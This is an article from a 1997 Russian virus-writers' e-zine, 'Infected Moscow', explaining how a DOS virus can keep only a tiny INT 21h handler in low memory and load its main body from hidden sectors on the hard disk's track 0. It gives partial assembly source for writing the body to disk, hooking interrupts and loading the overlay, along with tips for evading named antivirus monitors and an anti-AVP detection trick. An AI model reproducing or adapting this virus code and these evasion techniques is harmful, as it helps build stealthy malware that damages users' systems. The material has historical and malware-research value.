┌────────────────┬──┬────────┬─────────────────────────────┬─────────────────┐
│INFECTED MOSCOW │#1│ JAN'97 │(C)STEALTH Group MoscoW & Co │ one@redline.ru~ │
└────────────────┴──┴────────┴─────────────────────────────┴─────────────────┘
┌─────────────────────────────────────────────────┬────────────────────────┐
│ Посадка в память с оверлейным подгрузчиком      │(C) LovinGOD            │
└─────────────────────────────────────────────────┴────────────────────────┘

           Коротка память ДОСья, вот и полезли вирмэйкеры в XMS, EMS и прочие
заеблачные дали... А как насчет вируса любой сложности, занимающего в обычной
памяти, ну, скажем, байт пятьдесят ?

  Для реализации данного алгоритма необходимо решить следующие задачи:

1. Где хранить несколько десятков байт резидентного обработчика ?

  + Таблица векторов
  + Какой-нибудь закуток памяти - область стека DOS, буфера DOS и т.п.
  + Небольшой блок памяти
      (AVPTSR, -D, VSAFE, ANTIAPE не реагируют на выделение участка памяти
      менее 20h параграфов.
  + Свободные 100h байт сегмента 60
      Используются DOS при начальной загрузке;
      запустите COMMAND.COM, зайдите и выйдите из Windows, и вы увидите, что
      этот кусок памяти всегда будет нетронут.

2. Куда загружать тело жирное обработчика ?

   Под конец RAM, в сегменты > 9800h. Вы затрете транзитную часть COMMAND.COM,
   ну и хрен с ним, на то он там, чтобы его затирать. Пусть скажет спасибо,
   что еще и не заразили.
   Блок выделять НЕ НАДО. Во время работы вируса никто его лежбище не растоп-
   чет.

3. Где прятать тело жирное для подчитывания в RAM ?
   + На нулевой дорожке. 
     НО: в связи с расплодившимися boot-манагерами, писанными дебилами (зачем
         boot-manager'у больше одного, ну двух секторов ?), отступите десяток-
         другой секторов, не пишитесь начиная с 0/0/2
   + Где-нибудь на диске...
   + Можно еще подчитываться из зараженного файла. Но это плохое решение -
     для полиморфика, шифрованного вируса да и вообще...
            
   -------------------------------------------------------------------------

   Итак, в памяти находится небольшой обработчик INT 21h. При вызове значащей
 для вируса функции обработчик считывает с 0 дорожки остальной свой код куда-
 нибудь под конец 640-килобайтного презервуара и передает управление туда.

 Достоинства:
  - решается проблема обхода детекторов посадки вируса в память
  - вирус практически не виден в памяти вследствие его малой длины
 Недостатки:
  - необходимость работы с диском (скорость, особенности в защищенных средах)

;---------------------------------------------------------------------------
;                заголовок COM-файла
.MODEL TINY
.CODE
.RADIX 16
.386P
 ORG 100
;---------------------------------------------------------------------------
 VIR_SECCOUNT    EQU 4          ; количество секторов, необходимых для вируса
 SEC_SINCE       EQU 0A         ; номер сектора на 0 дорожке, откуда начинать
                                ; запись секторов
 OVL_SEG         EQU 09A00      ; сегмент подгрузки оверлейной части вируса
;---------------------------------------------------------------------------
START:
VIRUS:

; ...

; если вируса нет в памяти, то записываем тело на диск в 0 дорожку и
; инсталлируем вирус в память
; (если оверлейная часть уже на диске... можно проверить, но для верности 
; лучше писанемся еще раз

PC_POSSESS:
  PUSH CS CS
  POP  DS ES
                                ; запись тела вируса на диск
  MOV AX,0300+VIR_SECCOUNT
  MOV CX,0000+SEC_SINCE
  MOV DX,0080
  MOV BX,BP                     ; в BP хранится смещение начала вируса
  CALL INT_13
  JC  CUREINRAM
                                ; перенос постоянной резидентной части
                                ; по адресу 0060:0000
  MOV AX,0060
  MOV ES,AX
  MOV SI,BP
  ADD SI,SIXTYSEG-VIRUS
  XOR DI,DI
  MOV CX,(END_SIXTYSEG-SIXTYSEG)/4+1
  CLD
  REP MOVSD

; ...   установка необходимых векторов (skipped)

SIXTYSEG:               ; сегмент 60 - здесь находится постоянная резидентная
                        ; часть обработчиков прерываний

 MY21_60:               ; обработчик INT 21h

  CMP AH,0F1            ; ответ на запрос о наличии копии в памяти
  JNE NXTFNC
  IRET
                        ; обработчик функции (здесь 4B00)
 NXTFNC:
  xchg ax,bx            ; анти-AVP (защита обнаружения "CMP AX,4B00")
  CMP bx,4B00
  xchg ax,bx
  JNE JMPF21_60

  PUSHA
  PUSH DS ES

  MOV AX,OVL_SEG
  MOV ES,AX
                              ; считать с диска оверлейную часть обработчика
  MOV AX,0200+VIR_SECCOUNT
  MOV CX,0000+SEC_SINCE
  MOV DX,0080
  XOR BX,BX
  CALL INT_13
  JC  POP_JMPF21_60           ; при ошибке чтения отдать управление

  DB 0EA                          ; переход на подгруженный обработчик
  DD OVL_SEG*10000+(MY21-VIRUS)

                              ; точка возврата из оверлейной части
 CLEAR_OVL_EXIT21:

 POP_JMPF21_60:
  POP ES DS
  POPA

 JMPF21_60:
  DB 0EA
  OLD21_60 DD ?

;------------------------- процедура вызова INT 13h для совместимости с Win95
INT_13 PROC
  PUSH AX
  WIN_VER EQU $+1
  MOV AL,00
  CMP AL,4
  POP AX
  JNE JUST_INT13

  PUSHF
  DB 09A
  DD 007003EEh
  RETN

  JUST_INT13: INT 13
  RETN
  INT_13 ENDP
;------------------------------------------------
END_SIXTYSEG:

;------------------- оверлейная часть обработчика
OVERLAY:
MY21:

; ... обработчик функции skipped

  JMP 4 PTR CS:[TMP_RETFADDR-VIRUS]     ; возврат из оверлейной части в
                                        ; основную для завершения обработчика

                        ; процедура для вызова функций DOS из обработчика
 CALLDOS:
  PUSH 0060
  POP  FS
  PUSHF
  CALL 4 PTR FS:[OLD21_60-SIXTYSEG]
  RETN

  TMP_RETFADDR DD 00600000+(CLEAR_OVL_EXIT21-SIXTYSEG)  ; адрес возврата

END_OVERLAY:
